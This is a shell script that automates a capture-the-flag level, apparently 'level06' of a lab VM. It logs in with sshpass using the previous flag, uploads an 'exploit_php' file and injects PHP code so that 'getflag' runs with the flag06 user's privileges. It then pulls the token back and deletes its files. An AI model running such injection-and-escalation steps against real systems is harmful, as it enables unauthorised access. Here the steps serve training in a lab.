#!/bin/sh -eu

PREVIOUS_FLAG=../../level05/flag
ADDRESS=192.168.122.214
PORT=4242
FLAG=../flag

# Copy the `exploit_php` file to the virtual machine
sshpass -f ${PREVIOUS_FLAG} 2>/dev/null \
	scp -P ${PORT} -p exploit_php level06@${ADDRESS}:/tmp

# Connect to the virtual machine using SSH and run the script
# to inject the PHP code, run the `getflag` command through `level06.php`,
# itself called by the `level06` file, which is run with the `flag06` user privileges
sshpass -f ${PREVIOUS_FLAG} <run_altered_php_and_save_token_to_file.sh 2>/dev/null \
	ssh -p ${PORT} level06@${ADDRESS} 'sh -s'

# Copy the token to the host machine
sshpass -f ${PREVIOUS_FLAG} 2>/dev/null \
	scp -P ${PORT} level06@${ADDRESS}:/tmp/token ${FLAG}

# Clean the virtual machine
sshpass -f ${PREVIOUS_FLAG} 2>/dev/null \
	ssh -p ${PORT} level06@${ADDRESS} 'rm /tmp/{exploit_php,getflag_as_flag06,token}'

exit 0
